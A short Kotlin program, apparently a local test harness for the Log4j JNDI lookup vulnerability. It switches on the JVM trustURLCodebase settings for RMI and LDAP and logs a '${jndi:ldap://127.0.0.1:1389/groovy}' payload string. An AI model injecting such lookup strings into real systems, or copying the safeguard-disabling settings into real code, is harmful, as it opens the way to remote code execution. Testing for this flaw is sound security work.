import org.apache.logging.log4j.LogManager

fun main() {
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true")
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true")

    val logger = LogManager.getLogger("GroovyTest")
    logger.error("\${jndi:ldap://127.0.0.1:1389/groovy}")
}
